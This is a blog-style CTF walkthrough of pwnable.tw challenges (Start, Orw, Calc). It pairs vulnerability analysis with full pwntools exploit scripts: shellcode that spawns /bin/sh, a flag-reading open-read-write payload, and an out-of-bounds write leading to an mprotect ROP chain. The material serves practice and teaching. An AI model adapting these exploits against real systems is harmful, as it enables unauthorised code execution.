---
layout: post
title:  "Pwnable TW Walkthrough"
date:   2024-12-27 19:59:45 +0300
categories: jekyll update
---

**Contents**
* TOC
{:toc}
## Start

The first challenge, we're given relatively small 32-bit binary:

```bash
$ checksec ./start
Arch:       i386-32-little
RELRO:      No RELRO
Stack:      No canary found
NX:         NX disabled
PIE:        No PIE (0x8048000)
Stripped:   No

$ file ./start
./start: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped
```

In addition to being statically linked, the binary has no libc, and seems to be a manually-written assembly file. IDA Decompilation attempt fails. \
By reading the assembly, it seems to be pushing the "Let's start the CTF:" string to the stack. It then 
writes this message to `stdout`. By using `stace`, we can see it then attempts to read 60 bytes off the user, right to the same stack address of the prompt string. Hence, linear stack overflow. \
The solution is simple - write shellcode, make sure the RA is set to its address. 

The main challenge is the fact that there's ASLR, and we have no leak. But notice the binary isn't PIE, hence we can jump to static code addresses. A very interesting code to jump to, is right before the call to `write`:

```bash
mov ecx, esp
mov dl, 14h
mov bl, 1
mov al, 4
int 80h  // sys_write
xor ebx, ebx
mov dl, 3Ch
mov al, 3
int 80h  // sys_read
```

This means we can easily obtain stack leak, as we can print values that resides within the stack. Win.

```python
#!/usr/bin/python3

from pwn import *
from time import sleep

HOST = 'chall.pwnable.tw'
PORT = 10000
context.arch='i386'
BINARY = './start'
GDB_SCRIPT = '''
b *_start+60
commands
    p "In start.."
end

c
'''

READ_BUF_SIZE = 60
WRITE_BUF_SIZE = 0x14
WRITE_STACK_BUF_TO_STDOUT_ADDR = 0x8048087
SHELLCODE = '''
mov ebx, {0}
xor ecx, ecx
xor edx, edx
push 0x0b
pop eax
int 0x80

BIN_SH:
.ascii "/bin/sh"
.byte 0x00
'''
# Unfortunately, x86 doesn't supports "lea ebx, [eip + BIN_SH]". Moved the raw offset for it..
OFFSET_TO_BIN_SH = 0x0e


def leak_stack_addr(p):
    buf = b'A' * WRITE_BUF_SIZE # pad
    buf += p32(WRITE_STACK_BUF_TO_STDOUT_ADDR)
    p.send(buf)
    leak_buf = p.recv(WRITE_BUF_SIZE)
    assert(len(leak_buf) == WRITE_BUF_SIZE)
    
    addr = u32(leak_buf[: 4])
    return addr

def write_and_jump_to_shellcode(p, shellcode_addr):
    buf = b'B' * WRITE_BUF_SIZE
    buf += p32(shellcode_addr) 
    shellcode_asm = SHELLCODE.format(shellcode_addr + OFFSET_TO_BIN_SH)
    log.info(f'Writing shellcode:\n{shellcode_asm}')
    buf += asm(shellcode_asm)
    buf += b'C' * (READ_BUF_SIZE - len(buf))
    p.send(buf)

def exploit(p):
    p.recvuntil(b"Let's start the CTF:")
    stack_leak = leak_stack_addr(p)    
    shellcode_addr = stack_leak + WRITE_BUF_SIZE
    log.info(f'stack_leak: {hex(stack_leak)} shellcode_addr: {hex(shellcode_addr)}')
    write_and_jump_to_shellcode(p, shellcode_addr)


def main():
    is_debug = False 
    is_remote = True
    if is_debug:
        p = gdb.debug(BINARY, gdbscript=GDB_SCRIPT)
    else:
        if is_remote:
            p = remote(HOST, PORT)
        else:
            p = process(BINARY)

    exploit(p)

    log.info('Win')
    p.interactive()

if __name__ == '__main__':
    main()
```

## Orw

Open, read, write. \

```bash
$ checksec orw
[*] '/home/itay/projects/pwnable_tw/orw/orw'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No

$ file orw
orw: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e60ecccd9d01c8217387e8b77e9261a1f36b5030, not stripped

$ ldd orw
    linux-gate.so.1 (0xee44a000)
    libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xee1fd000)
    /lib/ld-linux.so.2 (0xee44c000)
```

Using the previous challenge's access, we can copy the used `libc` and `ld-linux` to our local setup, and use `patchelf` to mimic the remote environment. \
Using `strace`, we can see the binary installs a "seccomp" by calling:

```bash
prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)  = 0
prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, {len=12, filter=0xff8c8cac}) = 0
```

After some readings, the `no_new_privs` bit prevents inherited processes to grant extra privileges, such as changing the `setuid` bit, or add capabilities. This may hint this challenge involves spawning a new process. We also see the shellcode is stored within a constant address within the binary. \
Writing an ORW shellcode solves this challenge easily. By default, my environment doesn't allows executing code from the .BSS. But since DEP is disabled on the remote, the following works:

```python
#!/usr/bin/python3

from pwn import *
from time import sleep

HOST = 'chall.pwnable.tw'
PORT = 10001
context.arch='i386'
BINARY = './orw'
GDB_SCRIPT = '''
b *0x804858a
commands
    p "In SC.."
end

c
'''

SHELLCODE_ADDR = 0x804a060
SHELLCODE = '''
mov ebx, {0}
xor ecx, ecx
xor edx, edx
push 0x05
pop eax
int 0x80

mov ebx, eax
mov ecx, {1}
mov edx, 0x40
push 0x03
pop eax
int 0x80

push 0x01
pop ebx
mov ecx, {1}
mov edx, 0x40
push 0x04
pop eax
int 0x80

FLAG:
.ascii "/home/orw/flag"
.byte 0x00

BUF:
.rept 0x40
.byte 0x00
.endr
'''
OFFSET_TO_FLAG = 0x31
OFFSET_TO_BUF = 0x40


def write_shellcode(p):
    shellcode_asm = SHELLCODE.format(SHELLCODE_ADDR + OFFSET_TO_FLAG, SHELLCODE_ADDR + OFFSET_TO_BUF)
    log.info(f'Writing shellcode:\n{shellcode_asm}')
    buf = asm(shellcode_asm)
    p.send(buf)

def exploit(p):
    p.recvuntil(b"Give my your shellcode:")
    write_shellcode(p)

def main():
    is_debug = False
    is_remote = True
    if is_debug:
        p = gdb.debug(BINARY, gdbscript=GDB_SCRIPT)
    else:
        if is_remote:
            p = remote(HOST, PORT)
        else:
            p = process(BINARY)

    exploit(p)

    log.info('Win')
    p.interactive()

if __name__ == '__main__':
    main()
```

## Calc

Microsoft calculator? 

```bash
$ checksec calc
[*] '/home/itay/projects/pwnable_tw/calc/calc'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No

$ file calc
calc: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=26cd6e85abb708b115d4526bcce2ea6db8a80c64, not stripped
```

The program allocates buffer of size `0x400` bytes on the stack, which stores the calculator expression. \
It reads up to `0x400` bytes, one byte at a time. Interesitngly, **there's off-by-one vuln**:

```c
while ( i < size && read(0, &c, 1) != -1 && c != '\n' )
  {
    if ( c == '+' || c == '-' || c == '*' || c == '/' || c == '%' || c > '/' && c <= '9' )
    {
      i_cp = i++;
      addr[i_cp] = c;
    }
  }
  addr[i] = 0;
```

While up to `0x400` bytes are read into the `0x400` bytes buffer, the last assignment of `addr[i] = 0` occurs 1 byte past the buffer's end. \
Next, `init_pool` is called, nullifies all `101` bytes of the pool's buffer. Notice, that since the pool buffer was declared as `int[101]`, there might be alignment issues - potentially leaving uninitialized bytes. So this probably means our previous off-by-one vuln has no impact. \
The interesting logic occurs within `parse_expr`. It has few sus notes:

1. The main loop is unbounded - it doesn't compares `i` value to `0x400`. The only check being made is whether or not `expr[i]` is an operator. As long as this is not the case, OOB-R would occur, eventually accessing the `pool` buffer. This means that if we initialize the `pool` buffer to some content, we might be able to leak it using `expr[i]`.

2. Logical vuln - Upon parsing the first subexperssion (the string prior to the operator), it is being compared to the `"0"` string. However, we may supply values such as `"000"` which would pass this check. 

3. `atoi` is being used, instead of `strtol`. This masks any possible number-parsing errors. 

4. Negative numbers handling - there seems to be a check that the resulting parsed number is positive, yet in case of a zero / negative number - nothing is being done (yet the flow continues without any error). 

5. The `pool` buffer current index is saved as its first member. Storage of the parsed number is being made solely using that index. If we can corrupt this value, for example by off-by-one of the `expr` buffer, we main obtain OOB-W using the `pool` buffer. 

```C
pool_i = (*pool)++;                     // Fetches the current pool index. The first int within the pool seems to be tracking this, sus.
                                        // There seems to be no check regarding its value, hence - potential OOB
pool[pool_i + 1] = parsed_num;          // Can be arbitrary large value
```

6. The `pool_i` index increments indefinetly, without any sanity check (that it doesn't passes the maximal value of `100`). This may serve as an important primitive for OOB-W.

7. The check of no two consequtive operators is being made on `expr[i], expr[i+1]`. This means a clear OOB-read for `expr[i + 1]` (which can be controlled easily using the `pool` buffer).

8. At the end of the loop, there's code that should handle operators precedence. The operators buffer is of size `100` bytes, yet its index can grow indefinetly. Clear OOB-RW. 

9. Also regarding the operators precedence code - the code path of decrementing the index of the operators buffer seems unreachable under regular flow (unless we would set `expr[i]` to something other than an operator). 

10. The `eval` function doesn't handles the case of `'%'` operator. Regardless of which operator was called, the `pool_i` index is being decremented. This means that by calling this method lots of times with the `'%'` operator, we would be able to decrement the `pool` index to some very low value. 

11. At the very end of the `parse_expr` function, we call `eval` on the `pool` and operators buffers, with a decreasing order. This means we can supply large number of operators, and the `pool` index would be altered. 

### Exploitation

Since the only allocation that involves the heap seems to be the subexperssion parsing (where it is only being used as a "read" variable), 
it might be challenging to exploit this challenge solely using heap corruptions. \
Hence, I'd probably aim for stack corruptions to achieve RCE. \
Because the binary isn't PIE, as well as partial RELRO, overwriting a GOT entry seems to be an easy way to call address of our wish. 

Notice, wer'e not given with a `libc` binary, **and the binary is statically linked**. This means it won't be able to fetch during runtime extra symbols it doesn't have off libc. 
Hence, I assume we'd like to achieve call primitive to some code within the binary itself. \
The class symbols of `execve, system[, win(classic ctf symbol..)]` aren't imported. 
However, the following interesting symbols are imported (the `calc` program itself doesn't have any interesting symbols for RCE):

1. `mprotect` - always a yummy target

2. `_dl_make_stack_executable` - good candidate

3. `environ` - holds the stack address. May be useful for stack leak primitive

4. Various writable `hook` functions, such as `__malloc_hook` and `dl_open_hooks`.  

5. File streams - our program `fflush`'s `stdout`, it might be interesting to overwrite the `stdout` file stream (**which resides at a known data address, as the binary is statically linked**) - `_IO_2_1_stdout_`.

#### Controlled RW - Shellcode Memory

First, we have to consider where we would place our shellcode at. 
While the `expr` buf seems as a very limited candidate, as it only allows numeric values, 
the `pool` buf may actually contain fully arbitrary content. \
Since the `%` operator wasn't implemented, we can concatenate our shellcode values, 4 bytes at a time, placing `%` in between. 
Also, notice that `pool` is a stack address.  

#### Stack Leakage

No matter which approach we'd take, a stack leak would probably serve us. \
Recall the program prompts the result using `pool[pool[0]]`. If we can find an interesting index, either before or after the pool within the stack, we can easily obtain such a leak. \
The `pool` buffer is always being allocated before the `expr` buffer. The following `pool` stack layout occurs:

```bash
pwndbg> x/50wx 0xff88ce28 - 0x20
0xff88ce08:     0xff88d3c8      0x080493f2      0xff88cfbc      0xff88ce28
0xff88ce18:     0x00000000      0x00000000      0x00000000      0x00000000
0xff88ce28:     0x00000000      0x00000000      0x00000000      0x00000000
```

Which means that `pool[-5]` would yield us the address of `pool` itself. \
How can we decrement the index to a value of our wish? 
We'd call `eval` multiple times with the `'%'` operator (such that it won't overwrite the `pool` itself). 
Moreover, we should make sure the index doesn't increments at all - which happens in case `atoi` returns a negative number (or zero). 

Therefore, the following simple expression would leak the `pool` address:

```bash
stack_leak_index = 5
buf = (b'00' + b'%') * stack_leak_index + b'00'
# Leaks 0xff88ce28
```

Notice we can use a similar approach, using a different offset, in order to leak the stack canary. 

#### Write primitive

We can obtain stack-write primitive pretty naively - by using the `pool` OOB-W, 
and writing arbitrary content to the stack. \
In terms of obtaining RCE, implementing a generic write primitive is probably an overkill for this challenge. 
We can simply do ROP, calling `mprotect` on our shellcode, and by the end of it, simply jump to the shellcode. \
However, I personally prefer exploitation routes that do not involve classic ROP 
(mainly because it is fragile, as well as not relevant to many of modern platform's mitigations). 

Therefore, my idea is to leverage the stack-write primitive into a generic write primitive. \
A cool approach we should consider, is overwriting `pool_i = pool[0]` (which resides on the stack) 
with our controlled input (this can be done easily, by first decrementing the pool index by 1). 
By doing so, we can obtain a real absolute-write primitive, 
as `pool[pool[0] + 1] = num` is being set (`num` is ACID). \
Notice that `pool[0] + 1` is parsed as an index to `int[]`, 
hence this would allow us arbitrary write primitive to 4-byte-aligned addresses, as follows:

```bash
addr = &pool + 4 * (num1 + 1)
*addr = num2
```

Where we control `num1, num2`, leaked the address of `pool`, 
and can access any address by wrap-around of the 32-bit VA space. \
This gives us a full arbitrary-write primitive!

#### RCE

Having any leak we desire, as well as a full arbtitrary write primitive, the road to RCE seems short. \
Instead of storing our shellcode within `pool` (which gets nullified for every new expression), 
we can store it at some constant RW memory area, for example at the `.bss`. \
After storing our shellcode at the data segment, we shall overwrite some exit handler / `.fini` pointer, 
such that our shellcode would get trigerred upon program termination. \
Lastly, we shall call `mprotect` on the stored shellcode, to enable NX. 
We can do so by classic ROP (I hate this though). 

### Solution

The following script pops our desired RCE shell:

```python
#!/usr/bin/python3

from pwn import *

HOST = 'chall.pwnable.tw'
PORT = 10100
context.arch='i386'
BINARY = './calc'
GDB_SCRIPT = '''
# b *0x08049160
# commands
#   p "Gonna update pool_i.."
# end

b *0x8049433
commands
    p "Exiting calc.."
end

c
'''

SHELLCODE = '''
mov ebx, {0}
xor ecx, ecx
xor edx, edx
push 0x0b
pop eax
int 0x80

BIN_SH:
.ascii "/bin/sh"
.byte 0x00
'''

# Unfortunately, x86 doesn't supports "lea ebx, [eip + BIN_SH]". Moved the raw offset for it..
OFFSET_TO_BIN_SH = 0x0e

# Offsets
POOL_TO_CALC_RA_OFFSET = 0x5a4

# Constants
POOL_ADDR_INDEX = 5
CANARY_INDEX = 11

# Addresses
SHELLCODE_ADDR = 0x080eca50  # RW memory within the data segment, always initialized to zeros
MPROTECT_ADDR = 0x806f1f0


def unsigned(n, bitness=32):
    if n < 0:
        n = n + 2**bitness
    return n

def pad(buf, alignment, delimiter=b'\x00'):
    if (len(buf) % alignment) == 0:
        return buf

    extra = (alignment - (len(buf) % alignment)) * delimiter
    return buf + extra

def splitted(buf, n):
    for i in range(0, len(buf), n):
        yield buf[i: i + n]

def readStack(p, index):
    log.info(f'read_stack, index: {index}')
    # Decrement pool[0] index times. 
    buf = b''
    buf += (b'00' + b'%') * index + b'00'
    log.info(f'Writing buf:\n{buf}')
    p.sendline(buf)

    # Read pool[pool[0]] = pool[-1 * index]
    leak = unsigned(int(p.recvline()[:-1], 10))
    return leak

def write32(p, pool_addr, addr, value):
    log.info(f'arbitrary_write: *{hex(addr)} = {hex(value)}')
    assert(addr % 4 == 0)
    # addr = &pool + 4 * (num + 1). 
    # We omit the 1, because the index would be incremented by 1
    num = int(unsigned(addr - pool_addr) / 4)

    buf = (b'00' + b'%') * 2
    buf += str(num).encode()
    buf += b'%' + str(value).encode()
    log.info(f'Writing buf:\n{buf}')
    p.sendline(buf)
    result = unsigned(int(p.recvline()[:-1], 10))
    log.info(f'Result:\n{result}')

def writeBytes(p, pool_addr, addr, bytes_):
    assert (len(bytes_) % 4) == 0
    for i, buf_bytes in enumerate(splitted(bytes_, 4)):
        bytes_value = u32(buf_bytes)
        write32(p, pool_addr, addr=addr + 4 * i, value=bytes_value)

def writeShellcodeAtAddr(p, pool_addr, addr):
    shellcode_asm = SHELLCODE.format(addr + OFFSET_TO_BIN_SH)
    log.critical(f'Writing shellcode:\n{shellcode_asm}')
    shellcode = asm(shellcode_asm)
    shellcode = pad(shellcode, 4)
    writeBytes(p, pool_addr, addr=addr, bytes_=shellcode)

def writeMprotectAndJumpToShellcodeRop(p, pool_addr, shellcode_addr):
    calc_ra_addr = pool_addr + POOL_TO_CALC_RA_OFFSET 
    rop_bytes = b''
    rop_bytes += p32(MPROTECT_ADDR)
    rop_bytes += p32(SHELLCODE_ADDR)
    rop_bytes += p32(SHELLCODE_ADDR & 0xfffff000)
    rop_bytes += p32(0x2000)
    rop_bytes += p32(7)
    log.critical(f'Writing rop bytes:\n{rop_bytes}')
    writeBytes(p, pool_addr, addr=calc_ra_addr, bytes_=rop_bytes)

def exitCalcLoop(p):
    buf = b''
    p.sendline(buf)

def exploit(p):
    p.recvuntil(b"=== Welcome to SECPROG calculator ===\n")
    
    pool_addr = readStack(p, POOL_ADDR_INDEX)
    log.info(f'pool_addr: {hex(pool_addr)}')
    assert((pool_addr % 4 == 0) and (pool_addr != 0))

    canary = readStack(p, CANARY_INDEX)
    log.info(f'canary: {hex(canary)}')
    assert((canary & 0xff == 0) and (canary != 0))

    writeShellcodeAtAddr(p, pool_addr, addr=SHELLCODE_ADDR)
    writeMprotectAndJumpToShellcodeRop(p, pool_addr, SHELLCODE_ADDR)
    exitCalcLoop(p)


def main():
    is_debug = False
    is_remote = True 
    if is_debug:
        p = gdb.debug(BINARY, gdbscript=GDB_SCRIPT)
    else:
        if is_remote:
            p = remote(HOST, PORT)
        else:
            p = process(BINARY)

    exploit(p)

    log.info('Win')
    p.interactive()

if __name__ == '__main__':
    main()
```

## 3x17

TODO
